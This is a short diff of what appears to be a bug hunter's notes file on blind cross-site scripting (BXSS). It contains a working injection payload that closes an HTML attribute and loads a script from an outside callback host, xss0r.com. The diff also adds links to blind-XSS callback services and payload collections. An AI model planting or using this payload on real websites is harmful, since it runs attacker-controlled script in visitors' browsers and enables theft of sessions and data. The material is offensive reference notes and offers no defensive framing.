@@ -9,9 +9,11 @@ BXSS:
 ====
 '"><script src=https://xss0r.com/c/lostsec></script>
 
-https://xss.js.org/#/
 
-# https://cyberlipon.xss.ht/
+https://xss.js.org/#/
+https://web-check.xyz/
+https://cyberlipon.xss.ht/
+
 
 >> https://swisskyrepo.github.io/PayloadsAllTheThings/
 >> https://lostsec.xyz/
